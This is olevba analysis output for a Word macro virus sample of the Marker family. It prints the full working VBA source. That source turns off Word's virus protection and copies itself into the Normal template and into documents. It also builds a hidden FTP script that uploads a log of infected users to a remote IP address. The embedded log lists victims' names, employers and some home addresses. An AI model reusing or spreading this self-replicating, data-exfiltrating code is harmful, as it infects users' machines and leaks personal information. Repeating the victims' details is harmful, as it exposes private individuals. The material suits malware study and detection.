olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-33ab10a6c076b0f82edd86e18e208bcb8e72e7c8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-33ab10a6c076b0f82edd86e18e208bcb8e72e7c8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim chk As Object
Dim nt As Object

Sub Document_Open()
    On Error GoTo Err
    If Dir("C:\temp\~msd13.tmp") <> "" Then
        SetAttr "C:\temp\~msd13.tmp", 0
        Kill ("C:\temp\~msd13.tmp")                                  'delete April
    End If
    Set chk = NormalTemplate
    Call Scan_Code(chk)
    Set chk = ActiveDocument
    Call Scan_Code(chk)
    
    Exit Sub
Err:
    MsgBox "An unknown error occurred", 48, "Error"
End Sub

Function Scan_Code(chk As Object)
    For x = 1 To chk.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If chk.VBProject.VBComponents.Item(1).CodeModule.Lines(x, 1) = "    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With" Then
            If chk.VBProject.VBComponents.Item(1).CodeModule.Lines(x - 4, 1) = "Private Sub Document_Close()" Then
                startline = (x - 4)
            End If
        End If
        If chk.VBProject.VBComponents.Item(1).CodeModule.Lines(x, 1) = "    If LOF(1) = 0 Then GoTo q" Then
            If chk.VBProject.VBComponents.Item(1).CodeModule.Lines(x + 4, 1) = "    t.CodeModule.InsertLines i, a" Then
                lastline = (x + 13)
                lastline = lastline - startline + 1
            End If
        End If
    Next x
    If lastline <> "" And startline <> "" Then
        chk.VBProject.VBComponents.Item(1).CodeModule.deletelines startline, lastline
        chk.Save
        MsgBox chk & " " & " was disinfected successfully!", vbOKOnly, "Disinfection Complete!"
    End If
End Function
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.deletelines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.deletelines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 03:07:26 PM - Tuesday, 22 Dec 1998
' BCBSA
'



' 03:28:02 PM - Wednesday, 6 Jan 1999
' BCBSA
'



' 07:38:20 AM - Tuesday, 12 Jan 1999
' Fairmont Hotel - Chicago
'



' 08:52:41 AM - Monday, 1 Feb 1999
' Pam Ganiel
' Pamela Bray Ganiel
' 204 Foxfire Court
' Downers Grove, IL 60515



' 09:40:47 AM - Monday, 8 Feb 1999
' Steve Davino
'



' 10:07:53 AM - Wednesday, 10 Feb 1999
' Plaza Hotel
'



' 09:28:42 AM - Friday, 19 Feb 1999
' Plaza Hotel
'



' 10:05:01 AM - Friday, 19 Feb 1999
' Plaza Hotel
'



' 09:39:53  - Tuesday, 23 Feb 1999
' Pia Marocco
'



' 10:28:07  - Friday, 26 Feb 1999
' Dell Optiplex
'



' 08:21:19  - jueves, 4 mar 1999
' INDRA
'



' 11:23:23 PM - Wednesday, 10 Mar 1999
' Sam Panesar
'



' 10:02:54 PM - Wednesday, 10 Mar 1999
' ENDUSER
' Cynthia K. Seymour
' 126 University Gardens #3
' Charlottesville, VA 22903



' 04:44:24 PM - Sábado, 20 Mar 1999
' Gerardo Ibarra
'



' 05:06:43 PM - Tuesday, 23 Mar 1999
' 1518
'



' 02:05:06 PM - Wednesday, 24 Mar 1999
' Sanford Antignas
'



' 02:18:36  - Thursday, 25 Mar 1999
' AS
'



' 11:24:16  - Monday, 29 Mar 1999
' EGWY
'



' 03:22:12 PM - Thursday, 8 Apr 1999
' Ditry PC
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

